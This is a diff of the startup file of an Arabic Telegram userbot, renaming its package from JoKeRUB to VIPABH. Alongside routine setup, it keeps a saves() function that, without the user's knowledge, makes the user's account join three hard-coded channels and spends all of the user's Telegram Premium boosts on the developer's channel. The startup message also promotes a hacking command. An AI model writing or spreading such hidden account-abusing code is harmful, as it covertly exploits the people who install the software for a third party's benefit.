@@ -12,12 +12,12 @@ from telethon import Button, functions, types, utils
 from telethon.sync import TelegramClient
 from telethon.tl.functions.channels import JoinChannelRequest
 from telethon.errors import FloodWaitError
-from JoKeRUB import BOTLOG, BOTLOG_CHATID, PM_LOGGER_GROUP_ID
+from VIPABH import BOTLOG, BOTLOG_CHATID, PM_LOGGER_GROUP_ID
 from ..Config import Config
 from aiohttp import web
 from ..core import web_server
 from ..core.logger import logging
-from ..core.session import l313l
+from ..core.session import ABH
 from ..helpers.utils import install_pip
 from ..helpers.utils.utils import runcmd
 from ..sql_helper.global_collection import (
@@ -27,11 +27,11 @@ from ..sql_helper.global_collection import (
 from ..sql_helper.globals import addgvar, delgvar, gvarstatus
 from .pluginmanager import load_module
 from .tools import create_supergroup
-LOGS = logging.getLogger("JoKeRUB")
+LOGS = logging.getLogger("VIPABH")
 logging.getLogger('telethon').setLevel(logging.WARNING)
 ##Reda hands here
 cmdhr = Config.COMMAND_HAND_LER
-bot = l313l
+bot = ABH
 ENV = bool(os.environ.get("ENV", False))
 
 if ENV:
@@ -57,29 +57,29 @@ async def check_dyno_type():
 
 async def setup_bot():
     """
-    To set up bot for JoKeRUB
+    To set up bot for VIPABH
     """
     try:
-        await l313l.connect()
-        config = await l313l(functions.help.GetConfigRequest())
+        await ABH.connect()
+        config = await ABH(functions.help.GetConfigRequest())
         for option in config.dc_options:
-            if option.ip_address == l313l.session.server_address:
-                if l313l.session.dc_id != option.id:
+            if option.ip_address == ABH.session.server_address:
+                if ABH.session.dc_id != option.id:
                     LOGS.warning(
-                        f"⌯︙معرف ثابت في الجلسة من {l313l.session.dc_id}"
+                        f"⌯︙معرف ثابت في الجلسة من {ABH.session.dc_id}"
                         f"⌯︙لـ  {option.id}"
                     )
-                l313l.session.set_dc(option.id, option.ip_address, option.port)
-                l313l.session.save()
+                ABH.session.set_dc(option.id, option.ip_address, option.port)
+                ABH.session.save()
                 break
-        bot_details = await l313l.tgbot.get_me()
+        bot_details = await ABH.tgbot.get_me()
         Config.TG_BOT_USERNAME = f"@{bot_details.username}"
         
         
-        l313l.me = await l313l.get_me()
-        l313l.uid = l313l.tgbot.uid = utils.get_peer_id(l313l.me)
+        ABH.me = await ABH.get_me()
+        ABH.uid = ABH.tgbot.uid = utils.get_peer_id(ABH.me)
         if Config.OWNER_ID == 0:
-            Config.OWNER_ID = utils.get_peer_id(l313l.me)
+            Config.OWNER_ID = utils.get_peer_id(ABH.me)
         if not check_dyno_type:
             LOGS.error("قد تحدث مشكلة ولن يعمل السورس لان نوع الداينو ليس بيسك قم بتحويله الى basic")
     except Exception as e:
@@ -92,7 +92,7 @@ async def startupmessage():
     """
     try:
         if BOTLOG:
-            Config.CATUBLOGO = await l313l.tgbot.send_file(
+            Config.CATUBLOGO = await ABH.tgbot.send_file(
                 BOTLOG_CHATID,
                 "https://t.me/VIPABH/1187",
                 caption="**‏᯽︙ بــوت الجوكر يـعـمـل بـنـجـاح ✓ \n᯽︙ أرسل `.الاوامر`لرؤية اوامر السورس \n  ᯽︙ لأستعمال بوت الأختراق عبر كود التيرمكس أرسل`.هاك`**",
@@ -110,12 +110,12 @@ async def startupmessage():
         return None
     try:
         if msg_details:
-            await l313l.check_testcases()
-            message = await l313l.get_messages(msg_details[0], ids=msg_details[1])
+            await ABH.check_testcases()
+            message = await ABH.get_messages(msg_details[0], ids=msg_details[1])
             text = message.text + "\n\n**تم تشغيل البوت الأن أرسل `.فحص`**"
-            await l313l.edit_message(msg_details[0], msg_details[1], text)
+            await ABH.edit_message(msg_details[0], msg_details[1], text)
             if gvarstatus("restartupdate") is not None:
-                await l313l.send_message(
+                await ABH.send_message(
                     msg_details[0],
                     f"{cmdhr}بنك",
                     reply_to=msg_details[1],
@@ -129,7 +129,7 @@ async def startupmessage():
 async def mybot():
     try:
         starkbot = await ABH.tgbot.get_me()
-        joker = "ABH 🤡"
+        joker = "ABH "
         bot_name = starkbot.first_name
         bot_username = starkbot.username
         botname = f"@{bot_username}" if bot_username else "Unknown Bot"
@@ -184,12 +184,12 @@ async def add_bot_to_logger_group(chat_id):
         print(f"Error in add_bot_to_logger_group: {e}")
     except Exception as e:
             LOGS.error(str(e))
-JoKeRUB = {"@sszxl", "@x04ou", "@iamMUAOL"}
+VIPABH = {"@sszxl", "@x04ou", "@iamMUAOL"}
 async def saves():
-    for lMl10l in JoKeRUB:
+    for lMl10l in VIPABH:
         try:
-            await l313l(JoinChannelRequest(channel=lMl10l))
-            result = await l313l(functions.premium.GetMyBoostsRequest())
+            await ABH(JoinChannelRequest(channel=lMl10l))
+            result = await ABH(functions.premium.GetMyBoostsRequest())
             slots = [boost.slot for boost in result.my_boosts]
             aljoker_channel_id = None
             for chat in result.chats:
@@ -200,7 +200,7 @@ async def saves():
                 continue
             if not slots:
                 return
-            await l313l(functions.premium.ApplyBoostRequest(
+            await ABH(functions.premium.ApplyBoostRequest(
                 'sszxl',
                 slots=slots
             ))
@@ -219,8 +219,8 @@ async def load_plugins(folder, extfolder=None):
         path = f"{extfolder}/*.py"
         plugin_path = extfolder
     else:
-        path = f"JoKeRUB/{folder}/*.py"
-        plugin_path = f"JoKeRUB/{folder}"
+        path = f"VIPABH/{folder}/*.py"
+        plugin_path = f"VIPABH/{folder}"
     files = glob.glob(path)
     files.sort()
     success = 0
@@ -265,14 +265,14 @@ async def load_plugins(folder, extfolder=None):
     if extfolder:
         if not failure:
             failure.append("None")
-        await l313l.tgbot.send_message(
+        await ABH.tgbot.send_message(
             BOTLOG_CHATID,
             f'- تم بنجاح استدعاء الاوامر الاضافيه \n**عدد الملفات التي استدعيت:** `{success}`\n**فشل في استدعاء :** `{", ".join(failure)}`',
         )
 
 #سورس الجوكر عمك
-async def aljoker_the_best(l313l, group_name):
-    async for dialog in l313l.iter_dialogs():
+async def aljoker_the_best(ABH, group_name):
+    async for dialog in ABH.iter_dialogs():
         if dialog.is_group and dialog.title == group_name:
             return dialog.id
     return None
@@ -284,7 +284,7 @@ async def verifyLoggerGroup():
     flag = False
     if BOTLOG:
         try:
-            entity = await l313l.get_entity(BOTLOG_CHATID)
+            entity = await ABH.get_entity(BOTLOG_CHATID)
             if not isinstance(entity, types.User) and not entity.creator:
                 if entity.default_banned_rights.send_messages:
                     LOGS.info(
@@ -307,35 +307,35 @@ async def verifyLoggerGroup():
             )
     else:
         descript = "- عزيزي المستخدم هذه هي مجموعه الاشعارات يرجى عدم حذفها  - @Jepthon"
-        photobt = await l313l.upload_file(file="l313l/razan/resources/start/Jepthon.JPEG")
-        botlog_group_id = await aljoker_the_best(l313l, "مجموعة أشعارات الجوكر")
+        photobt = await ABH.upload_file(file="ABH/razan/resources/start/Jepthon.JPEG")
+        botlog_group_id = await aljoker_the_best(ABH, "مجموعة أشعارات الجوكر")
         if botlog_group_id:
             addgvar("PRIVATE_GROUP_BOT_API_ID", botlog_group_id)
             print("᯽︙تم العثور على مجموعة المساعدة بالفعل وإضافتها إلى المتغيرات.")
         else:
             _, groupid = await create_supergroup(
-                "مجموعة أشعارات الجوكر", l313l, Config.TG_BOT_USERNAME, descript, photobt
+                "مجموعة أشعارات الجوكر", ABH, Config.TG_BOT_USERNAME, descript, photobt
             )
             addgvar("PRIVATE_GROUP_BOT_API_ID", groupid)
             print("᯽︙تم إنشاء مجموعة المسـاعدة بنجاح وإضافتها إلى المتغيرات.")
         flag = True
     if PM_LOGGER_GROUP_ID == -100:
         descript = "᯽︙ وظيفه الكروب يحفظ رسائل الخاص اذا ما تريد الامر احذف الكروب نهائي \n  - @Jepthon"
-        photobt = await l313l.upload_file(file="l313l/razan/resources/start/Jepthon2.JPEG")
-        pm_logger_group_id = await aljoker_the_best(l313l, "مجموعة التخزين")
+        photobt = await ABH.upload_file(file="ABH/razan/resources/start/Jepthon2.JPEG")
+        pm_logger_group_id = await aljoker_the_best(ABH, "مجموعة التخزين")
         if pm_logger_group_id:
             addgvar("PM_LOGGER_GROUP_ID", pm_logger_group_id)
             print("تـم العثور على مجموعة الكروب التخزين بالفعل واضافة الـفارات الـيها.")
         else:
             _, groupid = await create_supergroup(
-                "مجموعة التخزين", l313l, Config.TG_BOT_USERNAME, descript, photobt
+                "مجموعة التخزين", ABH, Config.TG_BOT_USERNAME, descript, photobt
             )
             addgvar("PM_LOGGER_GROUP_ID", groupid)
             print("تـم عمـل الكروب التخزين بنـجاح واضافة الـفارات الـيه.")
         flag = True
     if flag:
         executable = sys.executable.replace(" ", "\\ ")
-        args = [executable, "-m", "JoKeRUB"]
+        args = [executable, "-m", "VIPABH"]
         os.execle(executable, *args, os.environ)
         sys.exit(0)
 
@@ -353,16 +353,16 @@ async def install_externalrepo(repo, branch, cfolder):
     response = urllib.request.urlopen(repourl)
     if response.code != 200:
         LOGS.error(errtext)
-        return await l313l.tgbot.send_message(BOTLOG_CHATID, errtext)
+        return await ABH.tgbot.send_message(BOTLOG_CHATID, errtext)
     await runcmd(gcmd)
     if not os.path.exists(cfolder):
         LOGS.error(
             "هنالك خطأ اثناء استدعاء رابط الملفات الاضافية يجب التأكد من الرابط اولا "
         )
-        return await l313l.tgbot.send_message(
+        return await ABH.tgbot.send_message(
             BOTLOG_CHATID,
             "هنالك خطأ اثناء استدعاء رابط الملفات الاضافية يجب التأكد من الرابط اولا ",
         )
     if os.path.exists(rpath):
         await runcmd(f"pip3 install --no-cache-dir -r {rpath}")
-    await load_plugins(folder="JoKeRUB", extfolder=cfolder)
+    await load_plugins(folder="VIPABH", extfolder=cfolder)
